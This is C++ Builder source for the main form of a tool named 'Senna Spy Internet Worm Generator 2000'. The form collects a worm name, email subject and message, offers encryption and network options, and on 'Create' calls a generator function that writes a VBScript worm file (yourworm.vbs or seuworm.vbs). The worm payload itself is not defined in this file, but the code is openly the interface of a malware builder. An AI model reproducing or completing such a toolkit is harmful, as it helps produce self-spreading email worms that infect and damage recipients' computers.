//---------------------------------------------------------------------------
#include <vcl.h>
#pragma hdrstop

void GeraWormVBScript( AnsiString cArquivo );

#include "formmain.h"
#include "shellapi.h"
#include "stdlib.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TFormWorm *FormWorm;

AnsiString cPanelTitulo1;
AnsiString cPanelTitulo2;
AnsiString cPanelTitulo3;

AnsiString cCheckCrypt;
AnsiString cCheckNetwork;

AnsiString cEditWormName;
AnsiString cEditSubject;
AnsiString cEditMessage;

AnsiString cLabelWormName;
AnsiString cLabelSubject;
AnsiString cLabelMessage;

AnsiString cBotaoSair;
AnsiString cBotaoCriar;

//---------------------------------------------------------------------------
__fastcall TFormWorm::TFormWorm(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------
void __fastcall TFormWorm::Panel3Click(TObject *Sender)
{
   ShellExecute( NULL, "open", Panel3->Caption.c_str(), NULL, NULL, SW_RESTORE );
}
//---------------------------------------------------------------------------
void __fastcall TFormWorm::FormCreate(TObject *Sender)
{
   randomize();

   cPanelTitulo1     = FormWorm->PanelTitulo1->Caption;
   cPanelTitulo2     = FormWorm->PanelTitulo2->Caption;
   cPanelTitulo3     = FormWorm->PanelTitulo3->Caption;

   FormWorm->Caption = cPanelTitulo1;

   cCheckCrypt       = FormWorm->CheckCrypt->Caption;
   cCheckNetwork     = FormWorm->CheckNetwork->Caption;

   cEditWormName     = FormWorm->EditWormName->Text;
   cEditSubject      = FormWorm->EditSubject->Text;
   cEditMessage      = FormWorm->EditMessage->Text;

   cLabelWormName    = FormWorm->LabelWormName->Caption;
   cLabelSubject     = FormWorm->LabelSubject->Caption;
   cLabelMessage     = FormWorm->LabelMessage->Caption;

   cBotaoSair        = FormWorm->BotaoSair->Caption;
   cBotaoCriar       = FormWorm->BotaoCriar->Caption;
}
//---------------------------------------------------------------------------
void __fastcall TFormWorm::RadioGroupIdiomaClick(TObject *Sender)
{
   if( RadioGroupIdioma->ItemIndex == 0 )
   {
       FormWorm->PanelTitulo1->Caption  = cPanelTitulo1;
       FormWorm->PanelTitulo2->Caption  = cPanelTitulo2;
       FormWorm->PanelTitulo3->Caption  = cPanelTitulo3;

       FormWorm->CheckCrypt->Caption    = cCheckCrypt;
       FormWorm->CheckNetwork->Caption  = cCheckNetwork;

       FormWorm->EditWormName->Text     = cEditWormName;
       FormWorm->EditSubject->Text      = cEditSubject;
       FormWorm->EditMessage->Text      = cEditMessage;

       FormWorm->LabelWormName->Caption = cLabelWormName;
       FormWorm->LabelSubject->Caption  = cLabelSubject;
       FormWorm->LabelMessage->Caption  = cLabelMessage;

       FormWorm->BotaoSair->Caption     = cBotaoSair;
       FormWorm->BotaoCriar->Caption    = cBotaoCriar;
   }
   else
   {
       FormWorm->PanelTitulo1->Caption  = "Senna Spy Internet Worm Generator 2000 Versao 1.00";
       FormWorm->PanelTitulo2->Caption  = "O Primeiro Gerador de Worms para Internet do Mundo!";
       FormWorm->PanelTitulo3->Caption  = "Grupo Hacker Brasileiro";

       FormWorm->CheckCrypt->Caption    = "Criptografar C�digo ?";
       FormWorm->CheckNetwork->Caption  = "Compat�vel com Rede ?";

       FormWorm->EditWormName->Text     = "Digite o nome do Worm aqui";
       FormWorm->EditSubject->Text      = "Digite o Subject da mensagem aqui...";
       FormWorm->EditMessage->Text      = "Digite o corpo da mensagem aqui...";

       FormWorm->LabelWormName->Caption = "Nome do Worm:";
       FormWorm->LabelSubject->Caption  = "Subject:";
       FormWorm->LabelMessage->Caption  = "Mensagem:";

       FormWorm->BotaoSair->Caption     = "&Sair";
       FormWorm->BotaoCriar->Caption    = "&Criar";
   }

   FormWorm->Caption = cPanelTitulo1;
}
//---------------------------------------------------------------------------
void __fastcall TFormWorm::BotaoSairClick(TObject *Sender)
{
   Application->Terminate();
}
//---------------------------------------------------------------------------
void __fastcall TFormWorm::BotaoCriarClick(TObject *Sender)
{
   AnsiString cArquivo;

   // Gera o Worm
   if( RadioGroupIdioma->ItemIndex == 0 )
       cArquivo = "yourworm.vbs";
   else
       cArquivo = "seuworm.vbs";

   // Gera Arquivo
   GeraWormVBScript( cArquivo );

   // Apresenta Mensagem
   if( RadioGroupIdioma->ItemIndex == 0 )
       ShowMessage( "Worm = '" + cArquivo.UpperCase() + "' generated !" );
   else
       ShowMessage( "Worm = '" + cArquivo.UpperCase() + "' gerado !" );

   // Finaliza Aplicacao
   Application->Terminate();
}
//---------------------------------------------------------------------------
